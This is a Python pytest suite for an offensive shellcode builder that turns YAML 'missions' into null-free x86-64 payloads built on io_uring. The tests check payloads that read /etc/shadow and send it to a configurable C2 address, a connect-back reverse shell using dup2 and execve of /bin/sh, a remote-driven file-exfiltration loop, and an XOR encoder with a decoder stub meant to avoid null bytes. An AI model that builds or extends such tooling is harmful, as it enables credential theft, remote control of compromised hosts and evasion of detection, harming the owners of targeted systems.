"""
test_builder.py — pytest suite for uring_builder.py

Run from repo root:
    python3 -m pytest builder/tests/ -v

Run from builder/:
    python3 -m pytest tests/ -v
"""

import struct
import sys
import subprocess
from pathlib import Path

import pytest

# Ensure builder module is importable
BUILDER_DIR = Path(__file__).parent.parent
sys.path.insert(0, str(BUILDER_DIR))

import uring_builder as builder


# ----------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------
def build_mission(yaml_name: str, ip: str = '127.0.0.1',
                  port: int = 4444, tmp_path: Path = None) -> tuple[bytes, dict]:
    """Run builder on a named YAML mission, return (binary, offsets)."""
    mission_path = BUILDER_DIR / 'missions' / yaml_name
    mission = builder.load_mission(mission_path)
    builder.apply_overrides(mission, ip, port)

    mission_code, data_asm = builder.render_layer2(mission)
    full_asm = builder.build_full_asm(mission_code, data_asm, mission['name'])

    out = tmp_path / f'{mission["name"]}.bin'
    label_offsets = builder.assemble(full_asm, out)
    binary = out.read_bytes()
    offsets = builder.compute_offsets(label_offsets)
    return binary, offsets


def xor_decode(artifact: bytes, state: int, step: int,
               region_len: int, payload_start: int) -> bytes:
    """Pure-python inverse of xor_encode() for roundtrip validation."""
    out = bytearray()
    ks = state
    for i in range(region_len):
        ks = (state + i * step) & 0xFFFF
        out.append(artifact[payload_start + i] ^ (ks >> 8))
    return bytes(out[:region_len])


# ----------------------------------------------------------------
# Unit tests
# ----------------------------------------------------------------
class TestMissionLoading:
    def test_load_exfil_shadow(self):
        m = builder.load_mission(BUILDER_DIR / 'missions/exfil_shadow.yaml')
        assert m['name'] == 'exfil_shadow'
        assert len(m['ops']) == 6
        assert m['config']['c2_ip'] == '127.0.0.1'
        assert m['config']['c2_port'] == 4444

    def test_load_connect_back(self):
        m = builder.load_mission(BUILDER_DIR / 'missions/connect_back.yaml')
        assert m['name'] == 'connect_back'
        assert len(m['ops']) == 6
        native = [list(op)[0] for op in m['ops']]
        assert 'dup2' in native and 'execve' in native

    def test_load_connect_back_recv(self):
        m = builder.load_mission(BUILDER_DIR / 'missions/connect_back_recv.yaml')
        assert m['name'] == 'connect_back_recv'
        assert len(m['ops']) == 3
        assert list(m['ops'][2]) == ['file_exfil_service']

    def test_override_ip(self):
        m = builder.load_mission(BUILDER_DIR / 'missions/exfil_shadow.yaml')
        builder.apply_overrides(m, '10.0.0.1', 443)
        assert m['config']['c2_ip']   == '10.0.0.1'
        assert m['config']['c2_port'] == 443

    def test_missing_ops_raises(self, tmp_path):
        bad_yaml = tmp_path / 'bad.yaml'
        bad_yaml.write_text("name: bad\n")
        with pytest.raises(ValueError, match='missing required field'):
            builder.load_mission(bad_yaml)

    def test_unknown_op_raises(self, tmp_path):
        bad_yaml = tmp_path / 'bad.yaml'
        bad_yaml.write_text("name: bad\nops:\n  - frobulate:\n      x: 1\n")
        m = builder.load_mission(bad_yaml)
        with pytest.raises(ValueError, match="Unknown opcode 'frobulate'"):
            builder.render_layer2(m)


class TestVariableResolution:
    def test_fd_load_known_var(self):
        code = builder.resolve_fd_load('file_fd')
        assert 'F_FILEFD' in code
        assert 'mov ecx' in code

    def test_fd_load_unknown_raises(self):
        with pytest.raises(ValueError, match='Unknown fd variable'):
            builder.resolve_fd_load('mystery_fd')

    def test_buf_load_auto(self):
        code = builder.resolve_buf_load('auto')
        assert 'F_RBUF' in code
        assert 'lea rcx' in code

    def test_len_load_literal(self):
        code = builder.resolve_len_load(128)
        assert '128' in code

    def test_len_load_4096_no_null_in_snippet(self):
        # 4096 = 0x1000 — builder uses shift trick to avoid null in imm
        code = builder.resolve_len_load(4096)
        assert 'shl' in code     # uses shift, not direct 0x1000 immediate
        assert '0x1000' not in code

    def test_len_load_frame_var(self):
        code = builder.resolve_len_load('bytes_read')
        assert 'F_NBYTES' in code


class TestRendering:
    """Renderer-level checks for SQE emission quality."""

    def _render(self, op_name: str, op: dict, uid: int = 1):
        renderer = builder.OP_RENDERERS[op_name]
        data = builder.DataSection()
        if op_name == 'connect':
            return renderer(op, uid, data, {'c2_ip': '127.0.0.1', 'c2_port': 4444})
        return renderer(op, uid, data)

    def test_send_checks_cqe_result(self):
        code = self._render('send', {'fd': 'sock_fd', 'buf': 'auto',
                                     'len': 'bytes_read'})
        assert 'js _fail' in code, 'send must guard against negative CQE.res'

    def test_send_stores_result(self):
        code = self._render('send', {'fd': 'sock_fd', 'buf': 'auto',
                                     'len': 'bytes_read',
                                     'result': 'bytes_read'})
        assert 'F_NBYTES' in code

    def test_close_ignores_result(self):
        code = self._render('close', {'fd': 'file_fd'})
        assert 'js _fail' not in code, \
            'close failure must not kill the host process'
        assert 'ignored' in code

    def test_read_send_requires_fd_and_send_fd(self):
        op = {'buf': 'auto', 'len': 4096}
        with pytest.raises(ValueError, match="requires 'fd'"):
            self._render('read_send', op)

    def test_read_send_loop_emits_labels(self):
        code = self._render('read_send', {
            'until_eof': True, 'fd': 'file_fd', 'send_fd': 'sock_fd',
            'buf': 'auto', 'len': 4096,
        })
        assert '_readsend_1:' in code
        assert '_readsend_1_done:' in code
        assert 'jz _readsend_1_done' in code    # EOF check
        assert 'jmp _readsend_1' in code        # loop back
        assert 'js _fail' in code

    def test_read_send_single_shot(self):
        code = self._render('read_send', {
            'fd': 'file_fd', 'send_fd': 'sock_fd', 'len': 128,
        })
        assert '_readsend_1:' not in code
        assert 'js _fail' in code

    def test_read_send_result_forbidden_with_until_eof(self):
        with pytest.raises(ValueError, match='not supported'):
            self._render('read_send', {
                'until_eof': True, 'fd': 'file_fd',
                'send_fd': 'sock_fd', 'result': 'bytes_read',
            })

    def test_read_send_eof_flag_sets_opcode(self):
        code = self._render('read_send', {
            'until_eof': True, 'fd': 'file_fd', 'send_fd': 'sock_fd',
        })
        assert 'OP_READ' in code and 'OP_SEND' in code
        assert 'SQ_OPCODE], 22' in code
        assert 'SQ_OPCODE], 26' in code

    def test_read_send_until_eof_uses_cur_pos(self):
        """
        Regression: without sqe->off = -1 (IORING_RW_CUR_POS), each READ
        restarts at file offset 0 and a file smaller than `len` loops
        forever (observed live: 12.9 MB infinite dump of a 10-byte file).
        """
        code = self._render('read_send', {
            'until_eof': True, 'fd': 'file_fd', 'send_fd': 'sock_fd',
        })
        assert 'mov qword [rax + SQ_OFF], -1' in code
        # order: SQE allocated before the off write
        call_pos  = code.index('call _get_sqe')
        off_pos   = code.index('SQ_OFF], -1')
        assert call_pos < off_pos

    def test_read_send_single_shot_has_no_cur_pos(self):
        code = self._render('read_send', {
            'fd': 'file_fd', 'send_fd': 'sock_fd', 'len': 128,
        })
        assert 'SQ_OFF], -1' not in code

    def test_recv_sets_opcode_and_result(self):
        code = self._render('recv', {'fd': 'sock_fd', 'buf': 'auto', 'len': 256,
                                     'result': 'bytes_read'})
        assert 'SQ_OPCODE], 27' in code
        assert 'js _fail' in code
        assert 'F_NBYTES' in code

    def test_recv_client_close_fails_not_loop(self):
        code = self._render('recv', {'fd': 'sock_fd', 'buf': 'auto', 'len': 128})
        assert 'jz' not in code   # plain recv loops are mission-level policy

    def test_file_exfil_service_full_flow(self):
        code = self._render('file_exfil_service', {'fd': 'sock_fd', 'recv_len': 128})
        # recv + openat + chunked exfil + close + outer loop labels
        assert 'SQ_OPCODE], 27'  in code            # recv
        assert 'SQ_OPCODE], 18'  in code            # openat with F_RBUF path
        assert 'SQ_OPCODE], 22'  in code            # read (from chunk engine)
        assert 'SQ_OPCODE], 26'  in code            # send
        assert 'SQ_OPCODE], 19'  in code            # close
        assert '_fxs_1_recv:' in code and '_fxs_1_done:' in code
        assert 'jz _fxs_1_done' in code             # recv==0 → exit clean
        assert 'jmp _fxs_1_recv' in code            # service loop
        # null-free terminator (al, not imm8 0)
        assert 'xor al, al' in code
        assert 'mov [rdx + rcx], al' in code

    def test_file_exfil_service_recv_len_guard(self):
        with pytest.raises(ValueError, match='recv_len'):
            self._render('file_exfil_service', {'fd': 'sock_fd', 'recv_len': 1024})


class TestNativeOps:
    """Native syscall ops (dup2, execve) — emitted, not SQE-based."""

    def _render_native(self, op_name: str, op: dict, uid: int = 1):
        return builder.NATIVE_RENDERERS[op_name](op, uid, builder.DataSection())

    def test_dup2_basic_native_encoding(self):
        code = self._render_native('dup2', {'fd': 'sock_fd', 'new_fd': 1})
        assert 'mov edi, [r13 + F_SOCKFD]' in code   # oldfd in EDI
        assert 'push 0x01' in code and 'pop rsi' in code
        assert 'push 0x21' in code                  # SYS_DUP2 = 33
        assert 'syscall' in code
        assert 'test eax, eax' in code              # native result in EAX
        assert 'js _fail' in code

    def test_dup2_zero_is_xor_not_push0(self):
        # push 0 encodes as 6A 00 → null byte in stream. Must use xor.
        code = self._render_native('dup2', {'fd': 'sock_fd', 'new_fd': 0})
        assert 'xor esi, esi' in code
        assert 'push 0x00' not in code
        # no bare `push 0` (6A 00 = null byte in the encoded stream)
        assert 'push 0\n' not in code

    def test_dup2_requires_fd_and_new_fd(self):
        with pytest.raises(ValueError, match="requires 'fd'"):
            self._render_native('dup2', {'new_fd': 1})
        with pytest.raises(ValueError, match='new_fd'):
            op = {'fd': 'sock_fd', 'new_fd': 300}
            self._render_native('dup2', op)

    def test_dup2_unknown_var_raises(self):
        with pytest.raises(ValueError, match='Unknown fd variable'):
            self._render_native('dup2', {'fd': 'mystery_fd', 'new_fd': 0})

    def test_execve_builds_argv_in_frame(self):
        code = self._render_native('execve',
                                   {'path': '/bin/sh', 'argv': ['/bin/sh', '-p']})
        assert 'mv qword' not in code
        assert 'F_ARGV + 0'  in code or 'F_ARGV + 0]' in code
        assert 'F_ARGV + 8'  in code
        # envp is NULL via xor (no null immediates / libc)
        assert 'xor rdx, rdx' in code
        assert 'push 0x3B' in code                  # SYS_EXECVE = 59
        assert 'syscall' in code
        assert 'js _fail' not in code               # success never returns
        # no null-byte-producing zeroing of argv NULL slot (frame pre-zeroed)
        assert 'F_ARGV + 16], 0' not in code

    def test_execve_argv_limit(self):
        with pytest.raises(ValueError, match='at most 3'):
            self._render_native('execve', {
                'path': '/bin/sh',
                'argv': ['/bin/sh', '-c', 'x', 'y'],
            })


class TestBuild:
    def test_exfil_shadow_assembles(self, tmp_path):
        binary, offsets = build_mission('exfil_shadow.yaml',
                                        ip='127.0.0.1', port=4444,
                                        tmp_path=tmp_path)
        assert len(binary) > 100
        assert 'CONFIG_IP_OFFSET'   in offsets
        assert 'CONFIG_PORT_OFFSET' in offsets

    def test_exfil_shadow_ip_patched(self, tmp_path):
        binary, offsets = build_mission('exfil_shadow.yaml',
                                        ip='192.168.1.100', port=9001,
                                        tmp_path=tmp_path)
        ip_off   = offsets['CONFIG_IP_OFFSET']
        port_off = offsets['CONFIG_PORT_OFFSET']
        assert binary[ip_off:ip_off+4] == bytes([192, 168, 1, 100])
        assert binary[port_off:port_off+2] == struct.pack('>H', 9001)

    def test_connect_back_assembles(self, tmp_path):
        binary, offsets = build_mission('connect_back.yaml',
                                        ip='10.10.10.1', port=1337,
                                        tmp_path=tmp_path)
        assert len(binary) > 100
        ip_off = offsets.get('CONFIG_IP_OFFSET')
        if ip_off:
            assert binary[ip_off:ip_off+4] == bytes([10, 10, 10, 1])

    def test_connect_back_smaller_than_exfil(self, tmp_path):
        b_exfil, _  = build_mission('exfil_shadow.yaml', tmp_path=tmp_path)
        b_cb,    _  = build_mission('connect_back.yaml', tmp_path=tmp_path)
        assert len(b_cb) < len(b_exfil)   # fewer ops → smaller binary

    def test_check_nulls_utility(self):
        assert builder.check_nulls(b'\x90\x90\x90') == []
        assert builder.check_nulls(b'\x90\x00\x90') == [1]
        assert builder.check_nulls(b'\x00\x00\x00') == [0, 1, 2]


class TestDataSection:
    def test_add_path(self):
        ds = builder.DataSection()
        label = ds.add_path('/etc/shadow')
        assert label.startswith('_mpath_')
        assert '/etc/shadow' in ds.emit()

    def test_add_config_default(self):
        ds = builder.DataSection()
        ip_lbl, port_lbl = ds.add_config('127.0.0.1', 4444)
        assert ip_lbl   == '_config_ip'
        assert port_lbl == '_config_port'
        emitted = ds.emit()
        assert '127, 0, 0, 1' in emitted
        assert '0x11, 0x5c' in emitted   # 4444 big-endian

    def test_add_config_custom_ip(self):
        ds = builder.DataSection()
        ds.add_config('10.20.30.40', 8080)
        emitted = ds.emit()
        assert '10, 20, 30, 40' in emitted
        assert '0x1f, 0x90' in emitted   # 8080 = 0x1F90 big-endian


class TestCLI:
    def test_cli_exfil_shadow(self, tmp_path):
        out    = tmp_path / 'shellcode.bin'
        header = tmp_path / 'shellcode.h'
        result = subprocess.run(
            [sys.executable,
             str(BUILDER_DIR / 'uring_builder.py'),
             str(BUILDER_DIR / 'missions/exfil_shadow.yaml'),
             '--ip', '127.0.0.1', '--port', '4444',
             '--out', str(out), '--header', str(header), '--quiet'],
            capture_output=True, text=True
        )
        assert result.returncode == 0, result.stderr
        assert out.exists()
        assert header.exists()
        assert header.read_text().count('CONFIG_IP_OFFSET') >= 1

    def test_cli_nonexistent_mission(self, tmp_path):
        result = subprocess.run(
            [sys.executable,
             str(BUILDER_DIR / 'uring_builder.py'),
             'missions/nonexistent.yaml'],
            capture_output=True, text=True
        )
        assert result.returncode != 0


# ----------------------------------------------------------------
# XOR encoder (--encode xor)
# ----------------------------------------------------------------
class TestXorEncode:
    def test_roundtrip_and_null_free(self, tmp_path):
        """Encoded artifact has zero nulls and decodes to the payload."""
        binary, _ = build_mission('exfil_shadow.yaml', tmp_path=tmp_path)
        assert binary.count(0) > 0          # precondition: raw payload has nulls

        encoded, meta = builder.xor_encode(binary)
        assert builder.check_nulls(encoded) == []
        assert meta['payload_start'] == builder._STUB_LEN

        payload = xor_decode(encoded, meta['state'], meta['step'],
                             meta['region_len'], meta['payload_start'])
        expect = binary + b'\x90' * (meta['region_len'] - len(binary))
        assert bytes(payload) == expect

    def test_stub_layout(self):
        """Decoder stub: fixed encodings + head-body-tail offsets."""
        stub_bytes = builder._STUB_TEMPLATE
        assert len(stub_bytes) == builder._STUB_LEN
        # backward call constant bytes E8 E8 FF FF FF at offset 21
        assert stub_bytes[21:26] == b'\xE8\xE8\xFF\xFF\xFF'
        # `jmp` head: region target displacement = stub_len - 26 = 13
        assert stub_bytes[3] == 0x48 and stub_bytes[6] == 0x0D
        # imm16 placeholder slots (state/step/len) — filled before dispatch
        for i in (9, 10, 13, 14, 17, 18):
            assert stub_bytes[i] == 0x00
        # filled stub has no zero bytes anywhere (xor_encode asserts too)
        artifact, _meta = builder.xor_encode(b'\xAA' * 256)
        assert 0 not in artifact[:builder._STUB_LEN]

    def test_region_len_padding(self):
        """Area length rounds up to >=0x100, low byte nonzero."""
        artifact, meta = builder.xor_encode(b'\xAA' * 0x100)
        assert meta['payload_start'] + meta['region_len'] == len(artifact)
        assert len(artifact) == builder._STUB_LEN + meta['region_len']

    def test_encoded_byte_not_null_even_after_rebuild(self, tmp_path):
        """N missions/srcs rebuild → always no zero bytes in output."""
        for yaml_name in ('exfil_shadow.yaml', 'connect_back.yaml'):
            binary, _ = build_mission(yaml_name, tmp_path=tmp_path)
            artifact, _meta = builder.xor_encode(binary)
            assert builder.check_nulls(artifact) == [], yaml_name
